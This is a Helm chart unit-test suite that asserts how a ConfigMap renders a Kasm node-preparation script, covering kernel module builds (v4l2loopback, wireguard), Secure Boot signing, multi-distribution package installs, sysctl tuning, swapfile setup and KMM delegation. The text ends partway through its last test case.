suite: reconcile script rendering

templates:
  - templates/configmap.yaml

tests:
  - it: renders the reconcile script with the default v4l2loopback module options
    asserts:
      - hasDocuments:
          count: 1
      - isKind:
          of: ConfigMap
      - equal:
          path: metadata.name
          value: RELEASE-NAME-kasm-node-prep
      - exists:
          path: data["ensure-modules.sh"]
      - matchRegex:
          path: data["ensure-modules.sh"]
          pattern: 'V4L2_DEVICES=''4'''
      - matchRegex:
          path: data["ensure-modules.sh"]
          pattern: 'V4L2_EXCLUSIVE_CAPS=''1'''
      - matchRegex:
          path: data["ensure-modules.sh"]
          pattern: 'modprobe v4l2loopback "devices=\$\{V4L2_DEVICES\}" "exclusive_caps=\$\{V4L2_EXCLUSIVE_CAPS\}"'
      - matchRegex:
          path: data["ensure-modules.sh"]
          pattern: 'V4L2_SOURCE_REPO=''https://github.com/umlaeute/v4l2loopback.git'''
      - matchRegex:
          path: data["ensure-modules.sh"]
          pattern: 'V4L2_SOURCE_REF=''v0\.15\.4'''
      - matchRegex:
          path: data["ensure-modules.sh"]
          pattern: 'RECONCILE_INTERVAL=''300'''
      - matchRegex:
          path: data["ensure-modules.sh"]
          pattern: 'set -euo pipefail'

  - it: reflects custom v4l2loopback module arguments in the script
    set:
      modules:
        v4l2loopback:
          videoDevices: 12
          exclusiveCaps: false
          sourceRef: v0.13.1
          sourceRepo: https://git.contoso.com/mirrors/v4l2loopback.git
      reconcileIntervalSeconds: 60
    asserts:
      - matchRegex:
          path: data["ensure-modules.sh"]
          pattern: 'V4L2_DEVICES=''12'''
      - matchRegex:
          path: data["ensure-modules.sh"]
          pattern: 'V4L2_EXCLUSIVE_CAPS=''0'''
      - matchRegex:
          path: data["ensure-modules.sh"]
          pattern: 'V4L2_SOURCE_REF=''v0\.13\.1'''
      - matchRegex:
          path: data["ensure-modules.sh"]
          pattern: 'V4L2_SOURCE_REPO=''https://git\.contoso\.com/mirrors/v4l2loopback\.git'''
      - matchRegex:
          path: data["ensure-modules.sh"]
          pattern: 'RECONCILE_INTERVAL=''60'''

  - it: omits the wireguard section entirely when wireguard is disabled by default
    asserts:
      - notMatchRegex:
          path: data["ensure-modules.sh"]
          pattern: 'ensure_wireguard'
      - notMatchRegex:
          path: data["ensure-modules.sh"]
          pattern: 'WIREGUARD_SOURCE_REPO'
      - notMatchRegex:
          path: data["ensure-modules.sh"]
          pattern: 'wireguard-linux-compat'

  - it: renders the wireguard section with the built-in kernel short circuit when enabled
    set:
      modules:
        wireguard:
          enabled: true
    asserts:
      - matchRegex:
          path: data["ensure-modules.sh"]
          pattern: 'WIREGUARD_SOURCE_REPO=''https://git\.zx2c4\.com/wireguard-linux-compat'''
      - matchRegex:
          path: data["ensure-modules.sh"]
          pattern: 'grep -q wg_ /proc/kallsyms'
      - matchRegex:
          path: data["ensure-modules.sh"]
          pattern: 'ensure_wireguard \|\| pass_status=1'
      - matchRegex:
          path: data["ensure-modules.sh"]
          pattern: 'modprobe wireguard'

  - it: renders only the wireguard section when v4l2loopback is disabled
    set:
      modules:
        v4l2loopback:
          enabled: false
        wireguard:
          enabled: true
    asserts:
      - notMatchRegex:
          path: data["ensure-modules.sh"]
          pattern: 'ensure_v4l2loopback'
      - notMatchRegex:
          path: data["ensure-modules.sh"]
          pattern: 'V4L2_DEVICES'
      - matchRegex:
          path: data["ensure-modules.sh"]
          pattern: 'ensure_wireguard'

  - it: always includes the Secure Boot signing helper and the reboot self-healing loop
    asserts:
      - matchRegex:
          path: data["ensure-modules.sh"]
          pattern: 'MOK_DIR=\"/etc/kasm-mok\"'
      - matchRegex:
          path: data["ensure-modules.sh"]
          pattern: 'scripts/sign-file'
      - matchRegex:
          path: data["ensure-modules.sh"]
          pattern: 'sha256 "\$\{MOK_DIR\}/mokPrivateKey" "\$\{MOK_DIR\}/mokPublicKey"'
      - matchRegex:
          path: data["ensure-modules.sh"]
          pattern: 'while true; do'
      - matchRegex:
          path: data["ensure-modules.sh"]
          pattern: 'sleep "\$RECONCILE_INTERVAL"'
      - matchRegex:
          path: data["ensure-modules.sh"]
          pattern: 'linux-headers-\$\{KERNEL_RELEASE\}'

  # --- Airgapped / offline support -------------------------------------------------------------

  - it: leaves the airgap source paths empty by default and keeps the git clone and package install fallback
    asserts:
      - matchRegex:
          path: data["ensure-modules.sh"]
          pattern: 'V4L2_SOURCE_PATH='''''
      - matchRegex:
          path: data["ensure-modules.sh"]
          pattern: 'clone --quiet --depth 1 --branch "\$ref" "\$repo" "\$dest"'
      - matchRegex:
          path: data["ensure-modules.sh"]
          pattern: 'toolchain=\(build-essential git kmod ca-certificates libelf1\)'
      - matchRegex:
          path: data["ensure-modules.sh"]
          pattern: 'DEBIAN_FRONTEND=noninteractive apt-get install -y --no-install-recommends "\$@"'

  - it: checks for pre-baked build prerequisites before doing any package installation
    asserts:
      - matchRegex:
          path: data["ensure-modules.sh"]
          pattern: 'build_deps_present\(\) \{'
      - matchRegex:
          path: data["ensure-modules.sh"]
          pattern: 'for tool in gcc make insmod; do'
      - matchRegex:
          path: data["ensure-modules.sh"]
          pattern: 'command -v git >/dev/null 2>&1'
      - matchRegex:
          path: data["ensure-modules.sh"]
          pattern: 'command -v openssl >/dev/null 2>&1'
      - matchRegex:
          path: data["ensure-modules.sh"]
          pattern: '\[ -d "\$KERNEL_BUILD" \]'
      - matchRegex:
          path: data["ensure-modules.sh"]
          pattern: 'if build_deps_present; then'
      - matchRegex:
          path: data["ensure-modules.sh"]
          pattern: 'build prerequisites already present; skipping package installation'
      # The presence check comes before the package manager is even looked for, and that lookup
      # before any install, so a pre-baked builder image with no package manager at all is never
      # hard-failed on the missing tool.
      - matchRegex:
          path: data["ensure-modules.sh"]
          pattern: '(?s)if build_deps_present; then.*if ! detect_pkg_manager; then.*pkg_install "\$\{toolchain\[@\]\}"'

  # --- Multi-family package layer --------------------------------------------------------------
  #
  # The container shares the node kernel but not its userland: the headers come from the BUILDER
  # IMAGE's repositories, so the script has to speak every package manager a matching image might
  # carry. One detector, one installer, and a per-family toolchain and headers spec.

  - it: detects the builder image's package manager and maps every supported family
    asserts:
      - matchRegex:
          path: data["ensure-modules.sh"]
          pattern: 'detect_pkg_manager\(\) \{'
      - matchRegex:
          path: data["ensure-modules.sh"]
          pattern: 'for tool in apt-get dnf microdnf yum tdnf zypper; do'
      - matchRegex:
          path: data["ensure-modules.sh"]
          pattern: 'pkg_install\(\) \{'
      - matchRegex:
          path: data["ensure-modules.sh"]
          pattern: 'apt-get update -qq'
      - matchRegex:
          path: data["ensure-modules.sh"]
          pattern: 'DEBIAN_FRONTEND=noninteractive apt-get install -y --no-install-recommends "\$@"'
      - matchRegex:
          path: data["ensure-modules.sh"]
          pattern: 'dnf install -y --setopt=install_weak_deps=False "\$@"'
      - matchRegex:
          path: data["ensure-modules.sh"]
          pattern: 'microdnf install -y "\$@"'
      - matchRegex:
          path: data["ensure-modules.sh"]
          pattern: 'yum install -y "\$@"'
      - matchRegex:
          path: data["ensure-modules.sh"]
          pattern: 'tdnf install -y "\$@"'
      - matchRegex:
          path: data["ensure-modules.sh"]
          pattern: 'zypper --non-interactive install --no-recommends "\$@"'
      # The log names the manager in use, and the no-manager error names all six.
      - matchRegex:
          path: data["ensure-modules.sh"]
          pattern: 'Installing build dependencies for kernel \$\{KERNEL_RELEASE\} with \$\{PKG_MANAGER\}'
      - matchRegex:
          path: data["ensure-modules.sh"]
          pattern: 'has none of apt-get, dnf, microdnf, yum, tdnf or zypper to install them'

  - it: installs the kernel headers with the spec each family resolves
    asserts:
      - matchRegex:
          path: data["ensure-modules.sh"]
          pattern: 'headers_spec="linux-headers-\$\{KERNEL_RELEASE\}"'
      - matchRegex:
          path: data["ensure-modules.sh"]
          pattern: 'toolchain=\(gcc make kmod git ca-certificates elfutils-libelf-devel\)'
      # dnf, microdnf and yum resolve the build tree's path to the package owning it (kernel-devel,
      # kernel6.12-devel or kernel-uek-devel), never /lib/modules/<ver>/build, which kernel-core owns.
      - matchRegex:
          path: data["ensure-modules.sh"]
          pattern: 'headers_spec="/usr/src/kernels/\$\{KERNEL_RELEASE\}"'
      - notMatchRegex:
          path: data["ensure-modules.sh"]
          pattern: 'pkg_install "/lib/modules'
      - matchRegex:
          path: data["ensure-modules.sh"]
          pattern: 'toolchain=\(gcc make binutils kmod git ca-certificates elfutils-libelf-devel\)'
      - matchRegex:
          path: data["ensure-modules.sh"]
          pattern: 'headers_spec="kernel-devel-\$\{KERNEL_RELEASE\}"'
      - matchRegex:
          path: data["ensure-modules.sh"]
          pattern: 'toolchain=\(gcc make kmod git ca-certificates libelf-devel\)'
      # zypper: the capability form, one argument, version without the rpm release suffix.
      - matchRegex:
          path: data["ensure-modules.sh"]
          pattern: 'headers_spec="kernel-\$\{KERNEL_RELEASE##\*-\}-devel = \$\{KERNEL_RELEASE%-\*\}"'
      - matchRegex:
          path: data["ensure-modules.sh"]
          pattern: 'headers_spec="kernel-default-devel = \$\{KERNEL_RELEASE\}"'
      - matchRegex:
          path: data["ensure-modules.sh"]
          pattern: 'pkg_install "\$headers_spec"'
      # The headers error says what was tried and that the builder image has to match the node.
      - matchRegex:
          path: data["ensure-modules.sh"]
          pattern: "found nothing for '\\$\\{headers_spec\\}'"
      - matchRegex:
          path: data["ensure-modules.sh"]
          pattern: 'same distribution family AND release as the node'
      - matchRegex:
          path: data["ensure-modules.sh"]
          pattern: 'image\.registry/image\.repository/image\.tag'

  # Two distributions ship kernels ahead of their default compiler: Ubuntu's HWE headers pin
  # CC = gcc-<N> in their Makefile without depending on it, and Oracle's UEK R8 is built with gcc 14
  # from gcc-toolset-14 while the el9 userland has gcc 11. The compiler the kernel was built with is
  # read from its .config; apt installs gcc-<N>, the RPM families switch to gcc-toolset-<N> on PATH.
  - it: installs or switches to the gcc the kernel was built with, from CONFIG_CC_VERSION_TEXT
    asserts:
      - matchRegex:
          path: data["ensure-modules.sh"]
          pattern: 'kernel_gcc_major\(\) \{'
      - matchRegex:
          path: data["ensure-modules.sh"]
          pattern: 'CONFIG_CC_VERSION_TEXT="\(\[\^"\]\*\)"'
      - matchRegex:
          path: data["ensure-modules.sh"]
          pattern: '"\$\{KERNEL_BUILD\}/\.config"'
      # Both spellings of the compiler line are parsed: "gcc-12 (...)" and "gcc (GCC) 14.2.1 ...".
      - matchRegex:
          path: data["ensure-modules.sh"]
          pattern: "-e 's/\\^\\[\\^ \\]\\*gcc-\\(\\[0-9\\]\\+\\)"
      - matchRegex:
          path: data["ensure-modules.sh"]
          pattern: "-e 's/\\^\\[\\^ \\]\\*gcc \\\\\\(\\[\\^\\)\\]\\*\\\\\\) \\(\\[0-9\\]\\+\\)"
      - matchRegex:
          path: data["ensure-modules.sh"]
          pattern: 'ensure_kernel_compiler\(\) \{'
      - matchRegex:
          path: data["ensure-modules.sh"]
          pattern: 'pkg_install "gcc-\$\{want\}"'
      - matchRegex:
          path: data["ensure-modules.sh"]
          pattern: 'toolset="/opt/rh/gcc-toolset-\$\{want\}/root/usr/bin"'
      - matchRegex:
          path: data["ensure-modules.sh"]
          pattern: 'pkg_install "gcc-toolset-\$\{want\}"'
      - matchRegex:
          path: data["ensure-modules.sh"]
          pattern: 'export PATH="\$\{toolset\}:\$\{PATH\}"'
      # No longer gated on apt; placed after the headers are in place (the .config comes with them),
      # and also run on the pre-baked path so a baked-in toolset is picked up without any install.
      - matchRegex:
          path: data["ensure-modules.sh"]
          pattern: '(?s)pkg_install "\$headers_spec".*if ! ensure_kernel_compiler; then'
      - notMatchRegex:
          path: data["ensure-modules.sh"]
          pattern: '\[ "\$PKG_MANAGER" = apt \] && ! ensure_kernel_compiler'
      - matchRegex:
          path: data["ensure-modules.sh"]
          pattern: '(?s)if build_deps_present; then.*if ! ensure_kernel_compiler; then.*DEPS_READY=1'

  - it: resolves the kernel build tree and hands it to every make invocation explicitly
    set:
      modules:
        wireguard:
          enabled: true
    asserts:
      - matchRegex:
          path: data["ensure-modules.sh"]
          pattern: 'resolve_kernel_build\(\) \{'
      - matchRegex:
          path: data["ensure-modules.sh"]
          pattern: 'KERNEL_BUILD="/usr/src/kernels/\$\{KERNEL_RELEASE\}"'
      # Resolved before the presence check and again after the headers land.
      - matchRegex:
          path: data["ensure-modules.sh"]
          pattern: '(?s)resolve_kernel_build\n  if build_deps_present; then.*pkg_install "\$headers_spec".*resolve_kernel_build'
      # v4l2loopback's Makefile calls the tree KERNEL_DIR, wireguard-linux-compat's KERNELDIR.
      - matchRegex:
          path: data["ensure-modules.sh"]
          pattern: 'make -C "\$src" KERNEL_DIR="\$KERNEL_BUILD"'
      - matchRegex:
          path: data["ensure-modules.sh"]
          pattern: 'make -C "\$src" KERNEL_DIR="\$KERNEL_BUILD" install-module'
      - matchRegex:
          path: data["ensure-modules.sh"]
          pattern: 'make -C "\$\{src\}/src" KERNELDIR="\$KERNEL_BUILD" module'
      - matchRegex:
          path: data["ensure-modules.sh"]
          pattern: 'make -C "\$\{src\}/src" KERNELDIR="\$KERNEL_BUILD" module-install'

  - it: names the package that ships the V4L2 core on every family in the videodev diagnosis
    asserts:
      - matchRegex:
          path: data["ensure-modules.sh"]
          pattern: 'linux-modules-extra-\$\{KERNEL_RELEASE\} on Ubuntu'
      - matchRegex:
          path: data["ensure-modules.sh"]
          pattern: 'kernel-modules on RHEL, Rocky Linux and AlmaLinux'
      - matchRegex:
          path: data["ensure-modules.sh"]
          pattern: 'kernel-modules-extra on Amazon Linux 2023'
      - matchRegex:
          path: data["ensure-modules.sh"]
          pattern: 'kernel-uek-modules \(UEK R7\) or kernel-uek-modules-desktop \(UEK R8\) on Oracle Linux'
      # The Ubuntu -kvm/cloud case is a kernel that can never work, not a missing package.
      - matchRegex:
          path: data["ensure-modules.sh"]
          pattern: '-kvm and cloud flavors are built without media support and can never work'

  - it: builds from the baked-in source trees and drops the clone path when both sourcePaths are set
    set:
      modules:
        v4l2loopback:
          sourcePath: /opt/kasm-modules/v4l2loopback
        wireguard:
          enabled: true
          sourcePath: /opt/kasm-modules/wireguard-linux-compat
    asserts:
      - matchRegex:
          path: data["ensure-modules.sh"]
          pattern: 'V4L2_SOURCE_PATH=''/opt/kasm-modules/v4l2loopback'''
      - matchRegex:
          path: data["ensure-modules.sh"]
          pattern: 'WIREGUARD_SOURCE_PATH=''/opt/kasm-modules/wireguard-linux-compat'''
      - matchRegex:
          path: data["ensure-modules.sh"]
          pattern: 'stage_source "\$V4L2_SOURCE_REPO" "\$V4L2_SOURCE_REF" "\$src" "\$V4L2_SOURCE_PATH" "\$\{V4L2_GIT_USERNAME:-\}" "\$\{V4L2_GIT_PASSWORD:-\}"'
      - matchRegex:
          path: data["ensure-modules.sh"]
          pattern: 'stage_source "\$WIREGUARD_SOURCE_REPO" "" "\$src" "\$WIREGUARD_SOURCE_PATH" "\$\{WIREGUARD_GIT_USERNAME:-\}" "\$\{WIREGUARD_GIT_PASSWORD:-\}"'
      - matchRegex:
          path: data["ensure-modules.sh"]
          pattern: 'cp -a "\$source_path" "\$dest"'
      # Nothing in this rendering reaches the network: no clone, and git is not even a prerequisite.
      - notMatchRegex:
          path: data["ensure-modules.sh"]
          pattern: 'git clone'
      - notMatchRegex:
          path: data["ensure-modules.sh"]
          pattern: 'command -v git'

  - it: keeps the clone path when only one enabled module has a sourcePath
    set:
      modules:
        v4l2loopback:
          sourcePath: /opt/kasm-modules/v4l2loopback
        wireguard:
          enabled: true
    asserts:
      - matchRegex:
          path: data["ensure-modules.sh"]
          pattern: 'V4L2_SOURCE_PATH=''/opt/kasm-modules/v4l2loopback'''
      - matchRegex:
          path: data["ensure-modules.sh"]
          pattern: 'WIREGUARD_SOURCE_PATH='''''
      - matchRegex:
          path: data["ensure-modules.sh"]
          pattern: 'clone --quiet --depth 1 "\$repo" "\$dest"'
      - matchRegex:
          path: data["ensure-modules.sh"]
          pattern: 'command -v git >/dev/null 2>&1'

  # --- Node tuning ------------------------------------------------------------------------------

  - it: renders no tuning at all by default
    asserts:
      - notMatchRegex:
          path: data["ensure-modules.sh"]
          pattern: 'ensure_sysctls'
      - notMatchRegex:
          path: data["ensure-modules.sh"]
          pattern: 'apply_sysctl'
      - notMatchRegex:
          path: data["ensure-modules.sh"]
          pattern: 'ensure_swap'
      - notMatchRegex:
          path: data["ensure-modules.sh"]
          pattern: 'SWAP_FILE'
      - notMatchRegex:
          path: data["ensure-modules.sh"]
          pattern: 'swapon'
      - notMatchRegex:
          path: data["ensure-modules.sh"]
          pattern: 'kubelet_allows_swap'

  - it: renders one apply_sysctl call per entry in the values map, and wires it into the loop
    set:
      tuning:
        sysctls:
          enabled: true
    asserts:
      - matchRegex:
          path: data["ensure-modules.sh"]
          pattern: 'apply_sysctl ''fs\.inotify\.max_user_instances'' ''1024'''
      - matchRegex:
          path: data["ensure-modules.sh"]
          pattern: 'apply_sysctl ''fs\.inotify\.max_user_watches'' ''524288'''
      - matchRegex:
          path: data["ensure-modules.sh"]
          pattern: 'ensure_sysctls \|\| pass_status=1'
      # sysctl tuning alone pulls in none of the swap machinery.
      - notMatchRegex:
          path: data["ensure-modules.sh"]
          pattern: 'ensure_swap'

  # apply_sysctl writes /proc/sys itself, the way sysctl(8) does, so the builder image needs no
  # procps: several RPM base images ship without it.
  - it: writes sysctls to /proc/sys directly instead of shelling out to sysctl
    set:
      tuning:
        sysctls:
          enabled: true
    asserts:
      # Dotted keys become a path; a key carrying "/" is used as-is (net/ipv4/conf/eth0.1/rp_filter).
      - matchRegex:
          path: data["ensure-modules.sh"]
          pattern: 'path="/proc/sys/\$\{key//\./\/\}"'
      - matchRegex:
          path: data["ensure-modules.sh"]
          pattern: 'path="/proc/sys/\$\{key\}"'
      - matchRegex:
          path: data["ensure-modules.sh"]
          pattern: 'current="\$\(cat "\$path" 2>/dev/null \|\| true\)"'
      - matchRegex:
          path: data["ensure-modules.sh"]
          pattern: 'printf ''%s\\n'' "\$value" >"\$path"'
      # /proc/sys renders tuples with tabs, so both sides are whitespace-normalized before comparing.
      - matchRegex:
          path: data["ensure-modules.sh"]
          pattern: 'sysctl_normalize\(\) \{'
      - matchRegex:
          path: data["ensure-modules.sh"]
          pattern: 'if \[ "\$\(sysctl_normalize "\$current"\)" = "\$\(sysctl_normalize "\$value"\)" \]; then'
      - matchRegex:
          path: data["ensure-modules.sh"]
          pattern: 'log "sysctl \$\{key\}: \$\{current:-unset\} -> \$\{value\}"'
      - matchRegex:
          path: data["ensure-modules.sh"]
          pattern: 'not sharing the node''s sysctl namespace'
      - notMatchRegex:
          path: data["ensure-modules.sh"]
          pattern: 'sysctl -w'
      - notMatchRegex:
          path: data["ensure-modules.sh"]
          pattern: 'sysctl -n'

  # Only the sysctl reconciler is on: nothing here ever installs a package, so the package layer
  # is not rendered at all.
  - it: keeps the whole package layer out of a sysctls-only script
    set:
      modules:
        v4l2loopback:
          enabled: false
        wireguard:
          enabled: false
      tuning:
        sysctls:
          enabled: true
    asserts:
      - matchRegex:
          path: data["ensure-modules.sh"]
          pattern: 'ensure_sysctls \|\| pass_status=1'
      - notMatchRegex:
          path: data["ensure-modules.sh"]
          pattern: 'pkg_install'
      - notMatchRegex:
          path: data["ensure-modules.sh"]
          pattern: 'detect_pkg_manager'
      - notMatchRegex:
          path: data["ensure-modules.sh"]
          pattern: 'PKG_MANAGER'
      - notMatchRegex:
          path: data["ensure-modules.sh"]
          pattern: 'ensure_build_deps'
      - notMatchRegex:
          path: data["ensure-modules.sh"]
          pattern: 'apt-get'
      - notMatchRegex:
          path: data["ensure-modules.sh"]
          pattern: 'linux-headers'
      - notMatchRegex:
          path: data["ensure-modules.sh"]
          pattern: '/usr/src/kernels'
      - notMatchRegex:
          path: data["ensure-modules.sh"]
          pattern: 'kernel-devel'
      - notMatchRegex:
          path: data["ensure-modules.sh"]
          pattern: 'headers_spec'

  # Extra entries merge into the defaults, the way Helm merges any map. 4194304 is the regression
  # case: a YAML number arrives as a float64, and unguarded formatting would emit "4.194304e+06",
  # which sysctl(8) rejects.
  - it: renders extra sysctl entries alongside the defaults, without scientific notation
    set:
      tuning:
        sysctls:
          enabled: true
          values:
            kernel.pid_max: 4194304
            net.core.somaxconn: 4096
    asserts:
      - matchRegex:
          path: data["ensure-modules.sh"]
          pattern: 'apply_sysctl ''kernel\.pid_max'' ''4194304'''
      - matchRegex:
          path: data["ensure-modules.sh"]
          pattern: 'apply_sysctl ''net\.core\.somaxconn'' ''4096'''
      - matchRegex:
          path: data["ensure-modules.sh"]
          pattern: 'apply_sysctl ''fs\.inotify\.max_user_instances'' ''1024'''
      - notMatchRegex:
          path: data["ensure-modules.sh"]
          pattern: 'e\+0'

  # Some tunables take a space separated tuple, which has to survive as a string.
  - it: passes a string sysctl value through untouched
    set:
      tuning:
        sysctls:
          enabled: true
          values:
            net.ipv4.tcp_rmem: "4096 87380 6291456"
    asserts:
      - matchRegex:
          path: data["ensure-modules.sh"]
          pattern: 'apply_sysctl ''net\.ipv4\.tcp_rmem'' ''4096 87380 6291456'''

  - it: renders the swap block, the kubelet safety check and the auto-size clamp when swap is enabled
    set:
      tuning:
        swap:
          enabled: true
    asserts:
      - matchRegex:
          path: data["ensure-modules.sh"]
          pattern: 'SWAP_DIR=''/var/lib/kasm-node-prep'''
      - matchRegex:
          path: data["ensure-modules.sh"]
          pattern: 'SWAP_FILE=''/var/lib/kasm-node-prep/kasm\.swap'''
      - matchRegex:
          path: data["ensure-modules.sh"]
          pattern: 'SWAP_SIZE_MIB=''0'''
      - matchRegex:
          path: data["ensure-modules.sh"]
          pattern: 'SWAP_SWAPPINESS=''80'''
      # The safety check reads the kubelet configuration from the two read-only host mounts.
      - matchRegex:
          path: data["ensure-modules.sh"]
          pattern: 'K3S_CONFIG_DIR=\"/host/etc/rancher/k3s\"'
      - matchRegex:
          path: data["ensure-modules.sh"]
          pattern: 'KUBELET_CONFIG=\"/host/var/lib/kubelet/config\.yaml\"'
      - matchRegex:
          path: data["ensure-modules.sh"]
          pattern: 'kubelet_allows_swap\(\) \{'
      - matchRegex:
          path: data["ensure-modules.sh"]
          pattern: "grep -q 'fail-swap-on=false' \"\\$config\""
      - matchRegex:
          path: data["ensure-modules.sh"]
          pattern: "grep -qE '\\^\\[\\[:space:\\]\\]\\*failSwapOn:\\[\\[:space:\\]\\]\\*false'"
      - matchRegex:
          path: data["ensure-modules.sh"]
          pattern: 'if ! kubelet_allows_swap; then'
      # Auto sizing: half of MemTotal (kB / 2048 == MiB / 2), clamped to Kasm's installer range.
      - matchRegex:
          path: data["ensure-modules.sh"]
          pattern: 'size=\$\(\( mem_total_kib / 2048 \)\)'
      - matchRegex:
          path: data["ensure-modules.sh"]
          pattern: 'if \[ "\$size" -lt 4096 \]; then'
      - matchRegex:
          path: data["ensure-modules.sh"]
          pattern: 'elif \[ "\$size" -gt 16384 \]; then'
      # Creation: fallocate with a dd fallback, 0600, mkswap, swapon.
      - matchRegex:
          path: data["ensure-modules.sh"]
          pattern: 'fallocate -l "\$\{size\}MiB" "\$SWAP_FILE"'
      - matchRegex:
          path: data["ensure-modules.sh"]
          pattern: 'dd if=/dev/zero of="\$SWAP_FILE" bs=1M count="\$size"'
      - matchRegex:
          path: data["ensure-modules.sh"]
          pattern: 'chmod 600 "\$SWAP_FILE"'
      - matchRegex:
          path: data["ensure-modules.sh"]
          pattern: 'mkswap "\$SWAP_FILE"'
      - matchRegex:
          path: data["ensure-modules.sh"]
          pattern: 'swapon "\$SWAP_FILE"'
      - matchRegex:
          path: data["ensure-modules.sh"]
          pattern: 'apply_sysctl vm\.swappiness "\$SWAP_SWAPPINESS"'
      - matchRegex:
          path: data["ensure-modules.sh"]
          pattern: 'ensure_swap \|\| pass_status=1'
      # swapon and mkswap come from util-linux, which not every base image ships; the swap pass
      # starts by making sure they exist and installs the package only when one is missing.
      - matchRegex:
          path: data["ensure-modules.sh"]
          pattern: 'ensure_swap_tools\(\) \{'
      - matchRegex:
          path: data["ensure-modules.sh"]
          pattern: 'if command -v swapon >/dev/null 2>&1 && command -v mkswap >/dev/null 2>&1; then'
      - matchRegex:
          path: data["ensure-modules.sh"]
          pattern: 'pkg_install util-linux'
      - matchRegex:
          path: data["ensure-modules.sh"]
          pattern: '(?s)ensure_swap\(\) \{.*if ! ensure_swap_tools; then.*if swap_active; then'
      # /etc/fstab is never written: the reconcile loop is what re-activates swap after a reboot.
      - matchRegex:
          path: data["ensure-modules.sh"]
          pattern: '/etc/fstab is deliberately never touched'
      - notMatchRegex:
          path: data["ensure-modules.sh"]
          pattern: '>>\s*/etc/fstab'
      # Swap alone does not drag in the sysctl reconciler, only the apply_sysctl helper it uses.
      - notMatchRegex:
          path: data["ensure-modules.sh"]
          pattern: 'ensure_sysctls'

  - it: detects an active swapfile from /proc/swaps by full path or chart-owned file name, never through swapon
    set:
      tuning:
        swap:
          enabled: true
    asserts:
      - matchRegex:
          path: data["ensure-modules.sh"]
          pattern: '(?s)swap_active\(\) \{.*while read -r name type _; do.*\[ "\$type" = file \].*\[ "\$name" = "\$SWAP_FILE" \].*\[ "\$\{name##\*/\}" = "\$\{SWAP_FILE##\*/\}" \].*done </proc/swaps'
      - notMatchRegex:
          path: data["ensure-modules.sh"]
          pattern: 'swapon --show'

  - it: honours a custom swapfile size, path and swappiness
    set:
      tuning:
        swap:
          enabled: true
          sizeMib: 8192
          hostPath: /mnt/kasm
          swappiness: 60
    asserts:
      - matchRegex:
          path: data["ensure-modules.sh"]
          pattern: 'SWAP_DIR=''/mnt/kasm'''
      - matchRegex:
          path: data["ensure-modules.sh"]
          pattern: 'SWAP_FILE=''/mnt/kasm/kasm\.swap'''
      - matchRegex:
          path: data["ensure-modules.sh"]
          pattern: 'SWAP_SIZE_MIB=''8192'''
      - matchRegex:
          path: data["ensure-modules.sh"]
          pattern: 'SWAP_SWAPPINESS=''60'''

  - it: drops the kubelet safety check entirely when tuning.swap.force is set
    set:
      tuning:
        swap:
          enabled: true
          force: true
    asserts:
      - notMatchRegex:
          path: data["ensure-modules.sh"]
          pattern: 'kubelet_allows_swap'
      - notMatchRegex:
          path: data["ensure-modules.sh"]
          pattern: 'K3S_CONFIG_DIR'
      - notMatchRegex:
          path: data["ensure-modules.sh"]
          pattern: 'KUBELET_CONFIG'
      - matchRegex:
          path: data["ensure-modules.sh"]
          pattern: 'tuning\.swap\.force is set; activating swap without confirming'
      # The rest of the swap path is unchanged.
      - matchRegex:
          path: data["ensure-modules.sh"]
          pattern: 'swapon "\$SWAP_FILE"'

  - it: strips the whole module build machinery from a tuning-only script
    set:
      modules:
        v4l2loopback:
          enabled: false
        wireguard:
          enabled: false
      tuning:
        sysctls:
          enabled: true
        swap:
          enabled: true
    asserts:
      - notMatchRegex:
          path: data["ensure-modules.sh"]
          pattern: 'ensure_build_deps'
      - notMatchRegex:
          path: data["ensure-modules.sh"]
          pattern: 'build_deps_present'
      - notMatchRegex:
          path: data["ensure-modules.sh"]
          pattern: 'stage_source'
      - notMatchRegex:
          path: data["ensure-modules.sh"]
          pattern: 'sign_module'
      - notMatchRegex:
          path: data["ensure-modules.sh"]
          pattern: 'MOK_DIR'
      - notMatchRegex:
          path: data["ensure-modules.sh"]
          pattern: 'KERNEL_BUILD'
      - notMatchRegex:
          path: data["ensure-modules.sh"]
          pattern: 'linux-headers'
      - notMatchRegex:
          path: data["ensure-modules.sh"]
          pattern: '/usr/src/kernels'
      - notMatchRegex:
          path: data["ensure-modules.sh"]
          pattern: 'kernel-devel'
      - notMatchRegex:
          path: data["ensure-modules.sh"]
          pattern: 'headers_spec'
      # ...while the reconcile loop and both tuning reconcilers are still there, and with them the
      # package installer, which swap keeps for util-linux.
      - matchRegex:
          path: data["ensure-modules.sh"]
          pattern: 'ensure_sysctls \|\| pass_status=1'
      - matchRegex:
          path: data["ensure-modules.sh"]
          pattern: 'ensure_swap \|\| pass_status=1'
      - matchRegex:
          path: data["ensure-modules.sh"]
          pattern: 'pkg_install util-linux'
      - matchRegex:
          path: data["ensure-modules.sh"]
          pattern: 'while true; do'

  # Swap alone: the installer stays (util-linux), the build machinery and every headers spec go.
  - it: keeps pkg_install but no build machinery in a swap-only tuning script
    set:
      modules:
        v4l2loopback:
          enabled: false
        wireguard:
          enabled: false
      tuning:
        swap:
          enabled: true
    asserts:
      - matchRegex:
          path: data["ensure-modules.sh"]
          pattern: 'pkg_install\(\) \{'
      - matchRegex:
          path: data["ensure-modules.sh"]
          pattern: 'detect_pkg_manager\(\) \{'
      - matchRegex:
          path: data["ensure-modules.sh"]
          pattern: 'ensure_swap_tools\(\) \{'
      - notMatchRegex:
          path: data["ensure-modules.sh"]
          pattern: 'ensure_build_deps'
      - notMatchRegex:
          path: data["ensure-modules.sh"]
          pattern: 'KERNEL_BUILD'
      - notMatchRegex:
          path: data["ensure-modules.sh"]
          pattern: 'linux-headers'
      - notMatchRegex:
          path: data["ensure-modules.sh"]
          pattern: '/usr/src/kernels'
      - notMatchRegex:
          path: data["ensure-modules.sh"]
          pattern: 'kernel-devel'
      - notMatchRegex:
          path: data["ensure-modules.sh"]
          pattern: 'headers_spec'
      - notMatchRegex:
          path: data["ensure-modules.sh"]
          pattern: 'ensure_sysctls'

  # --- KMM mode ---------------------------------------------------------------------------------
  #
  # modules.v4l2loopback.method=kmm hands the module to the Kernel Module Management operator, which
  # builds it into an image and runs its own worker pods. Every trace of it therefore has to leave
  # this script, or the two would race to insmod the same module.

  - it: renders no v4l2loopback section at all when the module is delegated to KMM
    set:
      modules:
        v4l2loopback:
          method: kmm
          kmm:
            image:
              registry: registry.contoso.com
              repository: kasm/v4l2loopback
      tuning:
        sysctls:
          enabled: true
    asserts:
      - hasDocuments:
          count: 1
      - notMatchRegex:
          path: data["ensure-modules.sh"]
          pattern: 'ensure_v4l2loopback'
      - notMatchRegex:
